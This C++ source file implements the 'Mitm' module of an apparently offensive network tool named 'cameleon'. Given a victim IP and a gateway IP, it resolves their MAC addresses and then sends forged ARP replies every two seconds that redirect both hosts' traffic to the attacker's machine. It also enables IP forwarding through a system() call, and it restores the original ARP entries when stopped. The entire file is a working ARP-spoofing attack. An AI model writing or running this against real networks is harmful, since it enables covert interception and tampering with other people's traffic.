#include "Mitm.hh"

#include <QThread>

#include <unistd.h>

#include "Debug.hh"

Mitm *Mitm::create(const StartModuleArgs & startModuleArgs)
{
    if (startModuleArgs.options.size() < 2)
    {
        return nullptr;
    }

    Mitm::Config    config;

    config.victimIP = startModuleArgs.options[0];
    config.gatewayIP = startModuleArgs.options[1];

    return new Mitm(startModuleArgs, config);
}

const QStringList Mitm::USAGE = { "Mitm module usage :",
                                  "\t cameleon start Mitm <module name> <victim_ip> <gateway_ip>"
                                };

const uint32_t Mitm::ARP_TIMEOUT = 4;

/* Class Mitm ****************************************************************/

Mitm::Mitm(const StartModuleArgs & startModuleArgs, const Config & config)
    : AModule("Mitm", startModuleArgs.name, startModuleArgs.iface),
      m_packetSender(startModuleArgs.iface.toStdString(), Mitm::ARP_TIMEOUT)
{
    DEBUG("Mitm::Mitm()", false);
    Tins::NetworkInterface  attackerIface(m_iface.toStdString());

    m_attacker.ip = attackerIface.addresses().ip_addr;
    m_attacker.mac = attackerIface.addresses().hw_addr;

    m_gateway.ip = Tins::IPv4Address(config.gatewayIP.toStdString());
    m_gateway.mac = arpRequest(m_gateway.ip);

    m_victim.ip = Tins::IPv4Address(config.victimIP.toStdString());
    m_victim.mac = arpRequest(m_victim.ip);

    createOriginalPackets();
    createPoisonPackets();

    m_timer.setSingleShot(false);
    connect(this, SIGNAL(startTimer(int)), &m_timer, SLOT(start(int)));
    connect(this, SIGNAL(stopTimer()), &m_timer, SLOT(stop()));
    connect(&m_timer, SIGNAL(timeout()), this, SLOT(poison()));
}

Mitm::~Mitm()
{
    DEBUG("Mitm::~Mitm() :" << this->objectName(), false);
}

void Mitm::start()
{
    DEBUG("Mitm::start() : Name:" << m_name << " Target:" << QString::fromStdString(m_victim.ip.to_string()), true);
    system("echo 1 > /proc/sys/net/ipv4/ip_forward");

    emit startTimer(2000);
}

void Mitm::stop()
{
    DEBUG("Mitm::stop()", true);
    emit stopTimer();

    for (quint32 i = 0; i < 2; ++i)
    {
        for (Tins::EthernetII & packet : m_originalPackets)
            m_packetSender.send(packet);
    }
    system("echo 0 > /proc/sys/net/ipv4/ip_forward");
}

const Tins::HWAddress<6> Mitm::arpRequest(const Tins::IPv4Address & targetIp)
{
    Tins::EthernetII    arpRequest = Tins::ARP::make_arp_request(targetIp, m_attacker.ip, m_attacker.mac);
    Tins::PDU           *response;

    response = m_packetSender.send_recv(arpRequest);

    if ( ! response)
    {
        DEBUG("Mitm::arpRequest() : Can't retrieve" << QString::fromStdString(targetIp.to_string()) << " associated MAC", true);
        // Thread is still living even if the module is deleted :/
        stop();
        return Tins::HWAddress<6>("42");
    }

    return response->rfind_pdu<Tins::ARP>().sender_hw_addr();
}

void Mitm::createOriginalPackets()
{
    // Tell victim thats gatewayIP is at gatewayMac
    m_originalPackets.push_back(
                Tins::ARP::make_arp_reply(m_victim.ip, m_gateway.ip, m_victim.mac, m_gateway.mac)
    );

    // Tell gateway thats victimIP is at victimMac
    m_originalPackets.push_back(
                Tins::ARP::make_arp_reply(m_gateway.ip, m_victim.ip, m_gateway.mac, m_victim.mac)
    );
}

void Mitm::createPoisonPackets()
{
    // Tell gateway thats victimIP is at attackerMac (target, sender, target, sender)
    m_poisonPackets.push_back(
                Tins::ARP::make_arp_reply(m_gateway.ip, m_victim.ip, m_gateway.mac, m_attacker.mac)
    );

    // Tell victim thats gatewayIP is at attackerMac
    m_poisonPackets.push_back(
                Tins::ARP::make_arp_reply(m_victim.ip, m_gateway.ip, m_victim.mac, m_attacker.mac)
                );
}

void Mitm::poison()
{
    for (Tins::EthernetII & packet : m_poisonPackets)
        m_packetSender.send(packet);
}

